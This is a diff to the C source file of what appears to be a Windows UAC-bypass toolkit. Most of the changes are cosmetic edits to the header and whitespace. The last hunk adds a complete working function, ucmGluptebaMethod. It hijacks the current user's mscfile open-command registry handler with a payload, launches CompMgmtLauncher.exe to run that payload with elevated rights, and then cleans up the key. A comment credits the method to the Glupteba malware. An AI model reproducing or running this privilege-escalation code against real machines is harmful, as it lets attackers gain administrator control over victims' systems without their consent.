@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2019
+*  (C) COPYRIGHT AUTHORS, 2016 - 2020
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.21
+*  VERSION:     3.24
 *
-*  DATE:        26 Oct 2019
+*  DATE:        20 Apr 2020
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -157,8 +157,8 @@ DWORD ucmDiskCleanupWorkerThread(
     SIZE_T                      sz;
     PVOID                       Buffer = NULL;
     LPWSTR                      fp = NULL;
-    UCM_ENIGMA0x3_CTX          *Context = (UCM_ENIGMA0x3_CTX *)Parameter;
-    FILE_NOTIFY_INFORMATION    *pInfo = NULL;
+    UCM_ENIGMA0x3_CTX* Context = (UCM_ENIGMA0x3_CTX*)Parameter;
+    FILE_NOTIFY_INFORMATION* pInfo = NULL;
     UNICODE_STRING              usName;
     IO_STATUS_BLOCK             IoStatusBlock;
     OBJECT_ATTRIBUTES           ObjectAttributes;
@@ -848,7 +848,7 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
                 switch (g_ctx->MethodExecuteType) {
 
                 case ucmExTypeIndirectModification:
-                
+
                     supIndirectRegAdd(REG_HKCU,
                         szKey,
                         lpTargetValue,
@@ -856,7 +856,7 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
                         szOldValue);
 
                     break;
-                
+
                 default:
                     RegSetValueEx(hKey, lpTargetValue, 0, REG_SZ,
                         (BYTE*)szOldValue, cbOldData);
@@ -908,5 +908,102 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
     }
 #endif
 
+    return MethodResult;
+}
+
+/*
+* ucmGluptebaMethod
+*
+* Purpose:
+*
+* Similar to previous mscfile hijack bypass except different target and indirect write.
+*
+* One of the UAC bypass methods used by WinNT/Glupteba.
+*
+* Fixed in Windows 10 RS2 as target autoelevation disabled and execution level defaulted to asInvoker.
+*
+*/
+NTSTATUS ucmGluptebaMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    BOOLEAN  bOldHandlerExist = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    LRESULT  lResult;
+    HKEY     hKey = NULL;
+    DWORD    cbOldHandlerData;
+    WCHAR    szKey[MAX_PATH * 2];
+    WCHAR    szOldHandlerValue[MAX_PATH + 1];
+    WCHAR    szRunCommand[MAX_PATH * 2];
+
+    INT      iRetryCount;
+
+    LPWSTR   lpTargetValue = TEXT("");
+
+    _strcpy(szKey, T_MSC_SHELL);
+    _strcat(szKey, T_SHELL_OPEN_COMMAND);
+
+    //
+    // Save old handler value if exist.
+    //
+    lResult = RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_READ, &hKey);
+    if (lResult == ERROR_SUCCESS) {
+
+        cbOldHandlerData = MAX_PATH * 2;
+        RtlSecureZeroMemory(&szOldHandlerValue, sizeof(szOldHandlerValue));
+        lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
+            (BYTE*)szOldHandlerValue, &cbOldHandlerData);
+        if (lResult == ERROR_SUCCESS)
+            bOldHandlerExist = TRUE;
+
+        RegCloseKey(hKey);
+    }
+
+    if (supIndirectRegAdd(REG_HKCU,
+        szKey,
+        lpTargetValue,
+        T_REG_SZ,
+        lpszPayload))
+    {
+        iRetryCount = 5;
+
+        do {
+
+            lResult = RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_READ, &hKey);
+            if (lResult == ERROR_SUCCESS) {
+                RegCloseKey(hKey);
+                break;
+            }
+
+            Sleep(1000);
+            iRetryCount--;
+
+        } while (iRetryCount);
+
+        _strcpy(szRunCommand, RUN_CMD_COMMAND);
+        _strcat(szRunCommand, COMPMGMTLAUNCHER_EXE);
+        if (supRunProcess(CMD_EXE, szRunCommand))
+            MethodResult = STATUS_SUCCESS;
+
+        Sleep(10000);
+    }
+
+    //
+    // Reset or remove value.
+    //
+    if (bOldHandlerExist) {
+
+        supIndirectRegAdd(REG_HKCU,
+            szKey,
+            lpTargetValue,
+            T_REG_SZ,
+            szOldHandlerValue);
+
+    }
+    else {
+        supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
+    }
+
+    SetEvent(g_ctx->SharedContext.hCompletionEvent);
     return MethodResult;
 }
